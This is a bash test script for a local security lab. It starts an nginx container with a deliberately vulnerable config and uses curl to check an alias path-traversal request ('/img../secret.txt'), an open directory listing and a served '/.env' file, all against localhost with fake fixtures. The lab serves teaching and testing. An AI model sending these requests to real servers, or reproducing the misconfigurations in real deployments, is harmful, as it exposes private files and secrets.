#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$repo_root"
network="lab1-star-$$"
container="lab1-star-nginx-$$"
base='http://127.0.0.1:18081'
cleanup() {
  docker rm -f "$container" >/dev/null 2>&1 || true
  docker network rm "$network" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker network create "$network" >/dev/null
docker run -d --name "$container" --network "$network" \
  -p 127.0.0.1:18081:8080 \
  -v "$repo_root/labs/lab-01-star/nginx.conf:/etc/nginx/conf.d/default.conf:ro" \
  -v "$repo_root/labs/lab-01-star/fixtures:/usr/share/nginx/html:ro" \
  nginx:1.29-alpine@sha256:5616878291a2eed594aee8db4dade5878cf7edcb475e59193904b198d9b830de >/dev/null

for _ in $(seq 1 20); do
  if curl -sS "$base/" -o /dev/null; then break; fi
  sleep 1
done

test_response() {
  local name="$1" path="$2" expected="$3" status
  status="$(curl --path-as-is -sS -o "/tmp/lab1-star-${name}.body" -w '%{http_code}' "$base$path")"
  printf '%s: GET %s -> HTTP %s\n' "$name" "$path" "$status"
  [[ "$status" == "$expected" ]]
}

# Check 1: alias traversal reaches the fake file one directory above the image directory.
test_response traversal '/img../secret.txt' 200
grep -q 'TRAVERSAL_FIXTURE=only-for-local-lab' /tmp/lab1-star-traversal.body

# Check 2: directory listing reveals names in the backup folder.
test_response listing '/backup/' 200
grep -q 'backup-note.txt' /tmp/lab1-star-listing.body

# Check 3: an undisallowed dotfile is served as plain text; its content is fake.
test_response dotfile '/.env' 200
grep -q 'TEST_FIXTURE_ONLY=1' /tmp/lab1-star-dotfile.body

printf 'Exposed test fixtures matched all three checks; no external host or real credentials were used.\n'
